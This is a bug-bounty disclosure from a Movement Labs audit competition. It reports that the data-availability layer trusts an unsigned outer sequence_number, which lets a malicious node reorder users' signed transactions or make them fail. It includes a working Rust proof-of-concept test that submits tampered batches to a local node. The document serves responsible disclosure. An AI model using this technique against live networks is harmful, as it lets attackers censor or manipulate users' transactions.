# 41715 \[BC-High] manipulating the sequence number of signed transactions to reorder them or prevent their execution

## #41715 \[BC-High] Manipulating the Sequence Number of signed transactions to reorder them or prevent their execution

**Submitted on Mar 17th 2025 at 18:33:00 UTC by @Capybara for** [**Attackathon | Movement Labs**](https://immunefi.com/audit-competition/movement-labs-attackathon)

* **Report ID:** #41715
* **Report Type:** Blockchain/DLT
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/attackathon-movement/tree/main/networks/movement/movement-full-node>
* **Impacts:**
  * Causing network processing nodes to process transactions from the mempool beyond set parameters

### Description

## Vulnerability Details

When the DA layer receives a `Transaction` blob there are no checks to validate whether the `sequence_number` received in the blob is legit, or an arbitrary value set by a malicious node.

```
pub struct Transaction {
	data: Vec<u8>,
	application_priority: u64,
	sequence_number: u64,  // <<-----
	id: Id,
}
```

This value should be ensured to be the same as the `sequence_number` of the transaction signed by the user instead of blindly trusting the node submitting the transaction to set the correct `sequence_number` for the transaction.

### Tampering the sequence\_number to reorder transactions or make others fail their execution

Suppose Bob's account `sequence_number` (which is like the `nonce` in the EVM) is `0`, and he submits 2 transactions for a block:

```
[
		Bob_Transaction1 {
			data: Vec<u8>,
			application_priority: 0,
			sequence_number: 0,
			id: 0xAA,
		},
		Bob_Transaction2 {
			data: Vec<u8>,
			application_priority: 0,
			sequence_number: 1,
			id: 0xBB,
		}
]
```

The `.data` for the first transaction has inside of it a `sequence_number` of 0, and for the second transaction is 1. This is what is expected:

```
[
		Bob_Transaction1 {
			data: {
                          payload,
                          chain_id,
                          expiration_timestamp_secs,
                          max_gas_amount,
                          gas_unit_price,
                          sender,
                          sequence_number: 0, // <<--
                       },
			application_priority: 0,
			sequence_number: 0,  // <<--
			id: 0xAA,
		},
		Bob_Transaction2 {
			data:  {
                          payload,
                          chain_id,
                          expiration_timestamp_secs,
                          max_gas_amount,
                          gas_unit_price,
                          sender,
                          sequence_number: 1, // <<--
                       },
			application_priority: 0,
			sequence_number: 1,  // <<--
			id: 0xBB,
		}
]
```

When submitting a batch of transaction blobs a node can't manipulate the value inside `.data` because it is signed and the DA layer verifies its signature.

But in the DA layer there are no checks on the validity of the received `sequence_number` that is outside of the data, therefore, the node can manually set the `sequence_number` of **Bob\_Transaction1** to a very high value:

```
[
		Bob_Transaction1 {
			data: {
                          payload,
                          chain_id,
                          expiration_timestamp_secs,
                          max_gas_amount,
                          gas_unit_price,
                          sender,
                          sequence_number: 0,
                       },
			application_priority: 0,
			sequence_number: 9999999,  // <<--
			id: 0xAA,
		},
		Bob_Transaction2 {
			data:  {
                          payload,
                          chain_id,
                          expiration_timestamp_secs,
                          max_gas_amount,
                          gas_unit_price,
                          sender,
                          sequence_number: 1,
                       },
			application_priority: 0,
			sequence_number: 1,
			id: 0xBB,
		}
]
```

As a consequence, both transactions will be sequenced to the nodes, then the nodes will try to run **Bob\_Transaction2** and fail with `SEQUENCE_NUMBER_TOO_NEW`, finally, **Bob\_Transaction1** is executed with success.

### Example

Bob sends funds to Alice in a transaction and Bob asks for an NFT from Alice in a different transaction.

Maliciously manipulating transaction `sequence_number` in a batch of txs allows for only one of the 2 transactions to succeed.

## Impact Details

Causing network processing nodes to process transactions beyond set parameters. Tampering the `sequence_number` of signed transactions may prevent others from executing.

### Proof of Concept

### Proof of Concept

In the proof of concept below Alice creates 2 transactions, and a malicious node manipulates their `sequence_number` to force one of them to fail its execution after being sequenced to all nodes by the DA.

Add the proof of concept to `./attackathon-movement/protocol-units/da/movement/protocol/tests/src/test/e2e/raw/sequencer.rs`

```
#[tokio::test]
async fn test_light_node_capy_poc() -> Result<(), anyhow::Error> {
    let mut client = LightNodeServiceClient::connect("http://0.0.0.0:30730").await?;

    // Create accounts
    let alice = LocalAccount::generate(&mut rand::rngs::OsRng);
    let bob = LocalAccount::generate(&mut rand::rngs::OsRng);

    println!("alice address: {:?}", alice.address());
    println!("bob address: {:?}", bob.address());

    // Fund account
    let faucet_client = FaucetClient::new(Url::parse("http://0.0.0.0:30732").expect("reason"), Url::parse("http://0.0.0.0:30731").expect("reason"));
    faucet_client.fund(alice.address(), 1_000_000).await.expect("Failed to fund sender account");
    faucet_client.fund(bob.address(), 1_000_000).await.expect("Failed to fund Bob's account");

    // Create txs
    let amount1: u64 = 100_000;
    let amount2: u64 = 10_000;
    let coin = TypeTag::from_str("0x1::aptos_coin::AptosCoin").expect("");
    let transaction_builder1 = TransactionBuilder::new(
        TransactionPayload::EntryFunction(EntryFunction::new(
            ModuleId::new(AccountAddress::from_str_strict("0x1")?, Identifier::new("coin")?),
            Identifier::new("transfer")?,
            vec![coin.clone()],
            vec![to_bytes(&bob.address())?, to_bytes(&amount1)?],
        )),
        SystemTime::now().duration_since(UNIX_EPOCH)?.as_secs() + 200,
        ChainId::new(27u8),
    )
        .sender(alice.address())
        .sequence_number(0)
        .max_gas_amount(5_000)
        .gas_unit_price(100);
    let transaction_builder2 = TransactionBuilder::new(
        TransactionPayload::EntryFunction(EntryFunction::new(
            ModuleId::new(AccountAddress::from_str_strict("0x1")?, Identifier::new("coin")?),
            Identifier::new("transfer")?,
            vec![coin.clone()],
            vec![to_bytes(&bob.address())?, to_bytes(&amount2)?],
        )),
        SystemTime::now().duration_since(UNIX_EPOCH)?.as_secs() + 200,
        ChainId::new(27u8),
    )
        .sender(alice.address())
        .sequence_number(1)
        .max_gas_amount(5_000);
 
    // create the blob write
    let signed_transaction1 = alice.sign_with_transaction_builder(transaction_builder1);
    let signed_transaction2 = alice.sign_with_transaction_builder(transaction_builder2);
    let txn_hash1 = signed_transaction1.committed_hash();
    let txn_hash2 = signed_transaction2.committed_hash();
    let mut transactions = vec![];
    let serialized_aptos_transaction1 = bcs::to_bytes(&signed_transaction1)?;
    let serialized_aptos_transaction2 = bcs::to_bytes(&signed_transaction2)?;
    let mut movement_transaction1 = Transaction::new(
        serialized_aptos_transaction1,
        0,
        2, // tampered sequence_number
    );
    let mut movement_transaction2 = Transaction::new(
        serialized_aptos_transaction2,
        0,
        1, // tampered sequence_number
    );

    let serialized_transaction1 = serde_json::to_vec(&movement_transaction1)?;
    let serialized_transaction2 = serde_json::to_vec(&movement_transaction2)?;
    transactions.push(BlobWrite { data: serialized_transaction1 });
    transactions.push(BlobWrite { data: serialized_transaction2 });
    let batch_write = BatchWriteRequest { blobs: transactions };

    // write the batch to the DA
    let batch_write_reponse = client.batch_write(batch_write).await?;

    Ok(())
}
```
